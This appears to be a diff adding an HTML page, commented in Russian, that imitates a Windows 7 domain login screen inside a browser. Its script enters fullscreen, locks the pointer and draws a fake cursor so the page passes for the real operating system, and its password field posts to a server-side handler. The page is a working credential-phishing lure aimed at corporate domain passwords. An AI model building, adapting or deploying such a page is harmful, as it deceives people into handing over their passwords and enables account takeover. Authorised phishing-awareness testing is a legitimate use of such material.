@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Название документа</title>
+  <style>
+    html, body {
+      width: 100%;
+      height: 100%;
+      margin: 0;
+    }
+    #one {
+      position: relative;
+      background-color: #99c2ff;
+      height: 480px;
+      width: 640px;
+      background-image: url(background.jpg);
+      background-size: cover;
+	  text-align: center;
+	  width: 100%;
+	  height: 100%;
+	 
+   
+  }
+
+  #one.disabled {
+  	display: none;
+  }
+
+  #one *{
+		box-sizing: border-box;
+		-ms-user-select: none; 
+	  -moz-user-select: none; 
+	  -webkit-user-select: none; 
+	  user-select: none;
+
+	}
+
+	#one *:active, #one *:hover, #one *:focus {
+	    outline: 0;
+	    outline-offset: 0;
+	}
+
+	#field {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+	
+    	
+		}
+	.strelka {
+	    width: 21px;
+	    height: 21px;
+	    position: absolute;
+	    right: -25px;
+	    border: none;
+	    border-radius: 50%;
+	    background: url(next.png) center center no-repeat;
+	    bottom: 0;
+	    background-size: cover;
+	}	
+	
+	#two {
+		width: 123px;
+	    height: auto;
+	    margin: auto;
+	 
+       
+
+		}
+		
+	
+		
+	form {
+		/*width: 215px;*/
+		width: 240px;
+	    /*display: flex;
+	    flex-direction: column;*/
+	}
+
+  .inputs {
+  	position: relative;
+  	margin-top: -15px;
+    /*margin-top: 15px;*/
+	 
+    	
+  }
+
+  .btn {
+    position: absolute;
+    bottom: 25px;
+    width: 30px;
+    height: 30px;
+    border: none;
+	 
+	
+	 
+    	
+  }
+
+  .btnleft {
+    left: 25px;
+    background-image: url(left_but.png);
+	border-radius: 15px; 
+   
+  }
+
+  .btnright {
+    right: 25px;
+    width: auto;
+    height: auto;   	
+  }
+
+  .passwd {
+  	/*border: 1px solid #98D8F9;*/
+    /*outline: 1px solid #98D8F9;*/
+    width: 100%;
+    padding-top: 3px;
+    padding-bottom: 3px;
+	border: .5px solid #666666;
+	box-shadow: 0 0 0 1px #98D8F9;
+    border-radius: 2px;
+    padding-left: 8px;
+    /*width: 170px;*/
+  }
+
+  .usr-name {
+    display: inline-block;
+	font-family: "Segoi UI";
+	font-size: 18px;
+	color: white;
+    width: 100%;
+    /*margin-top: 22px;*/
+    margin-bottom: 29px;
+    margin-top: 0;
+    padding-top: 10px;
+	
+   	
+  }
+	
+	svg#cursor {
+		position: absolute;
+		z-index: 100;
+		width: 30px;
+		height: auto;
+	}
+
+	a.button {
+		display: inline-block;
+	    width: 40px;
+	    height: 28px;
+	    position: relative;
+	    border: 0.5px solid #b8a0a0;
+	    -moz-box-shadow: 0 0 0 1px #707070;
+	    -webkit-box-shadow: 0 0 0 1px #707070;
+	    box-shadow: 0 0 0 1px #4c3837;
+	    -moz-border-radius: 3px;
+	    -webkit-border-radius: 3px;
+	    border-radius: 3px;
+	    background: -moz-linear-gradient(top, #F2F2F2 0%, #EBEBEB 50%, #DDDDDD 51%, #CFCFCF 100%);
+	    background: -webkit-gradient(linear, left top, left bottom, color-stop(0,#dc9498), color-stop(0.5,#9b8281),color-stop(0.51,#741c15),color-stop(1,#b51810));
+	    background: linear-gradient(top, #F2F2F2 0%, #EBEBEB 50%, #DDDDDD 51%, #CFCFCF 100%);
+	    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#F2F2F2', endColorstr='#CFCFCF',GradientType=0 );
+	    font: normal 12px sans-serif;
+	    color: black;
+	    text-decoration: none;
+	    transition: .2s;
+	}
+
+	a.button.hover {
+		opacity: .8;
+	}
+
+	a.button_halt {
+		border-radius: 3px 0 0 3px;
+	}
+
+	.ring {
+		display: inline-block;
+	    /*width: 13px;
+	    height: 13px;*/
+	    width: 17px;
+	    height: 17px;
+	    border-radius: 50%;
+	    /*border: 2px solid white;*/
+	    box-shadow: 0 0 0 0.2px #000 inset, 0 0 0 2px #fff inset;
+	    position: absolute;
+	    top: 50%;
+	    left: 50%;
+	    transform: translate(-50%, -50%);
+	}
+
+	.line {
+		position: absolute;
+	    top: 50%;
+	    left: 50%;
+	    transform: translate(-50%, -50%);
+	    width: 2px;
+	    height: 9px;
+	    background: #fff;
+	    border-radius: 7px;
+        border: 0.2px solid #000;
+	}
+
+	a.button_choise {
+		width: 20px;
+	    border-radius: 0 3px 3px 0;
+	    margin-left: 1px;
+	}
+
+	.button_choise .triangle {
+	    border: 5px solid transparent;
+	    border-width: 0 5px 5px;
+	    border-color: #fff transparent;
+	    position: absolute;
+	    top: 50%;
+	    left: 50%;
+	    transform: translate(-50%, -50%);
+	}
+
+	#glitch {
+		width: 100% !important;
+		height: 20% !important;
+
+		animation-name: blink;
+	  animation-timing-function: linear;
+	  animation-duration: 0.4s;
+	  animation-iteration-count: infinite;
+	}
+
+	.glitch_disabled {
+		display: none;
+	}
+
+	@keyframes blink {
+	  50% {
+	    opacity: 0;
+	  }
+	}
+
+	input::-ms-reveal,
+  input::-ms-clear {
+    display: none;
+  }
+
+
+
+</style>    
+    
+
+
+    
+    
+  </style>
+</head>
+<body>
+ <!-- onclick = "openFullscreen();" -->
+ <button id="emul">Run win7 emulation</button>
+<div id="one" class="disabled"> 
+	<img id="glitch" src="glitch.jpg">
+	<svg id="cursor" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="8 5 28 28" enable-background="new 0 0 28 28" xml:space="preserve">
+<polygon fill="#000" points="8.2,20.9 8.2,4.9 19.8,16.5 13,16.5 12.6,16.6 "/>
+<polygon fill="#000" points="17.3,21.6 13.7,23.1 9,12 12.7,10.5 "/>
+<rect fill="#fff" x="12.5" y="13.6" transform="matrix(0.9221 -0.3871 0.3871 0.9221 -5.7605 6.5909)" width="2" height="8"/>
+<polygon fill="#fff" points="9.2,7.3 9.2,18.5 12.2,15.6 12.6,15.5 17.4,15.5 "/>
+</svg>
+
+  <div id="field">
+
+    <form class="form" method="post" action="handler.php">
+      <img id="two" draggable="false" src=".\logo_user.png">
+      <span class="usr-name">domain\user</span>
+      <div class="inputs">
+        <input type="password" class="passwd" size="20" name="c" placeholder="Пароль" autocomplete="off">
+        <input type="submit" class="strelka" value=" ">
+      </div>
+      
+    </form>
+
+  </div>
+
+  <button class="btn btnleft"></button>
+  <!-- <button class="btn btnright"></button> -->
+	<div class="btn btnright halt" style="display: flex;">
+		<a class="button button_halt" href="#">
+			<div class="ring"></div>
+			<div class="line"></div>
+		</a>
+		<a class="button button_choise" href="#">
+			<div class="triangle"></div>
+		</a>
+	</div>
+</div>
+ <script>
+
+ 	var x = 500;
+	var y = 500;
+
+	var emulButton = document.getElementById("emul");
+	var cursor = document.getElementById("cursor");  // фейковый курсор
+	var elem = document.getElementById("one");	// блок с фейковой виндой
+	var glitch = document.getElementById("glitch");
+	let trigger = false;	// триггер нажатия на поле ввода пароля
+
+	// emulButton.addEventListener("click", openFullscreen);
+	emulButton.addEventListener("click", openFullscreen);
+
+	// function test(){
+	// 	setTimeout(() => openFullscreen(), 4750)
+	// }
+
+	function openFullscreen() {
+
+		elem.classList.remove("disabled");
+
+		let multiStateElements = [];	// массив элементов с разными состояниями в статике и при наведении
+		let passwdInput = document.getElementsByClassName("passwd")[0];
+		let btnHalt = document.getElementsByClassName("button_halt")[0];
+		let btnChoise = document.getElementsByClassName("button_choise")[0];
+
+		multiStateElements.push(btnHalt, btnChoise);
+
+
+
+		elem.removeEventListener("click", openFullscreen);
+		setTimeout(() => glitch.classList.add("glitch_disabled"), 4000);
+	  if (elem.requestFullscreen) {
+	  	
+
+	  	if (elem.mozRequestFullScreen) {
+	  		elem.requestFullscreen();
+	  		document.addEventListener("mozfullscreenchange", function() {
+				  elem.requestPointerLock()
+				});
+				// setTimeout(() => elem.requestPointerLock(), 400); // Обязательно выполнить после requestFullscreen и с задержкой, чтобы страница успела полностью перейти в полноэкранный режим.
+	  	} else {
+	  		elem.requestPointerLock();	//	Переводим курсор в режим поитер лок; Обязательно выполнять перед requestFullscreen, иначе не заработает в хромиуме.
+	    	elem.requestFullscreen();	//	Переводим экран в фулскрин
+	  	}
+	    
+	  	
+	  	// console.log(elem.getBoundingClientRect().top,elem.getBoundingClientRect().bottom,elem.getBoundingClientRect().left,elem.getBoundingClientRect().right);
+	    elem.addEventListener("mousemove", function(e){		// Подписываемся на изменение положения курсора
+	    	updateCursorCoords(e);
+	    });
+	    function updateCursorCoords(e){	  // двигаем фейковый курсор
+	    	// console.log("pageX: " + e.pageX,",pageY: " + e.pageY);
+	    	// console.log(e.movementX, e.movementY)
+	    	x += e.movementX;  // movementX = eNow.screenX - ePrevious.screenX /// e.movementX - доступно только на чтение
+		    y += e.movementY;
+
+		    if (y < 0) {
+		    	y = 0-5;
+		    }
+
+		    if (x < 0) {
+		    	x = 0-7;
+		    }
+
+		    if (x > elem.getBoundingClientRect().right - 15) {
+		    	x = elem.getBoundingClientRect().right - 15;
+		    }
+
+		    if (y > elem.getBoundingClientRect().bottom - 20) {
+		    	y = elem.getBoundingClientRect().bottom - 20;
+		    }
+
+	    	cursor.style.left = x + 'px';	// новые координаты для фейкового курсора
+				cursor.style.top = y + 'px';
+
+			for (let i = 0; i < multiStateElements.length; i++){ // добавление и удаление ховера у элементов
+				if(x >= multiStateElements[i].getBoundingClientRect().left && x <= multiStateElements[i].getBoundingClientRect().right 
+					&& y >= multiStateElements[i].getBoundingClientRect().top && y <= multiStateElements[i].getBoundingClientRect().bottom
+				) {  //  если курсор попал в поле какого-то элемента
+					if (!multiStateElements[i].classList.contains("hover")) { // то добавить ему hover
+						multiStateElements[i].classList.add("hover");
+					}
+					// multiStateElements[i].classList.add("hover");
+					multiStateElements.forEach(hoverElem => {		// а у остальных элементов из массива убрать hover
+						if (hoverElem != multiStateElements[i]) {
+							hoverElem.classList.remove("hover");
+						}
+					})
+				} 
+				else {
+					multiStateElements[i].classList.remove("hover");  //  удалить hover у всех элементов
+				}
+			}
+
+			
+			if (!trigger){ // фокусировка в инпуте при клике на него
+				trigger = true;
+				elem.addEventListener("click", function(){
+					if(x >= passwdInput.getBoundingClientRect().left && x <= passwdInput.getBoundingClientRect().right 
+						&& y >= passwdInput.getBoundingClientRect().top && y <= passwdInput.getBoundingClientRect().bottom
+					) {
+						passwdInput.focus();
+					}
+				});
+			}
+			
+	    }
+	  } else if (elem.mozRequestFullScreen) { /* Firefox */
+	    elem.mozRequestFullScreen();
+	  } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
+	    elem.webkitRequestFullscreen();
+	  } else if (elem.msRequestFullscreen) { /* IE/Edge */
+	    elem.msRequestFullscreen();
+	  }
+
+	  // document.onkeydown = function (e) {
+		// 	return false;
+		// }
+	}
+</script>
+
+
+
+ </script>
+ 
+</body>
+</html>
